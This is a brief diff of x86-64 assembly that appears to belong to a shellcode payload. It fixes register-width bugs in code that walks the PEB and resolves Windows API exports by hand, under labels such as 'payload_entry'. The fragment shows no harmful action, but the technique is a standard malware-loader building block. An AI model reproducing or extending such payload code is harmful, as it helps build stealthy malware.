@@ -224,7 +224,7 @@ _start:
     movzx eax, word [rdi + r8*2]
     mov edi, [rbx+0x1C]
     add rdi, rcx
-    mov eax, [edi + rax*4]
+    mov eax, [rdi + rax*4]
     add rax, rcx
     pop r8
     pop rdi
@@ -701,7 +701,7 @@ payload_entry:
     movzx eax, word [rdi + r8*2]
     mov edi, [rbx+0x1C]
     add rdi, rcx
-    mov eax, [edi + rax*4]
+    mov eax, [rdi + rax*4]
     add rax, rcx
     mov r9d, r11d
     pop r11
@@ -717,7 +717,12 @@ payload_entry:
 .not_found_payload:
     xor eax, eax
     xor r9d, r9d
-    pop r11 r10 r8 rdi rsi rbx
+    pop r11
+    pop r10
+    pop r8
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 
 ; Helper para PEB walking en el payload
